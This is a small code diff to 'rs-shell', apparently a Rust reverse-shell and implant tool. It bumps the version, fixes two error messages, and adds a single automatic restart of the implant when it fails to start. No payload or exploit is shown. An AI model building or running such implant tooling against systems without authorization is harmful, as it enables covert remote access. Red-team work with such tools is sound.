@@ -46,7 +46,7 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     let args = Command::new("rs-shell")
         .author("BlackWasp")
-        .version("0.2.0")
+        .version("0.2.1")
         .after_help("In a session, type 'help' for advanced integrated commands")
         .arg(
             Arg::new("mode")
@@ -174,7 +174,7 @@ fn main() -> Result<(), Box<dyn Error>> {
         match https_operator(args.get_one::<String>("ip").unwrap().as_str()) {
             Ok(_) => (),
             Err(r) => {
-                log::error!("Error starting the server : {}", r);
+                log::error!("Error starting the client : {}", r);
                 return Err(r);
             }
         }
@@ -184,8 +184,14 @@ fn main() -> Result<(), Box<dyn Error>> {
         match implant(args.get_one::<String>("ip").unwrap().as_str()) {
             Ok(_) => (),
             Err(r) => {
-                log::error!("Error starting the server : {}", r);
-                return Err(r);
+                log::error!("Error starting the implant : {}. Attempt to restart it", r);
+                match implant(args.get_one::<String>("ip").unwrap().as_str()) {
+                    Ok(_) => (),
+                    Err(r) => {
+                        log::debug!("Error still present : {}", r);
+                        return Err(r);
+                    }
+                }
             }
         }
     }
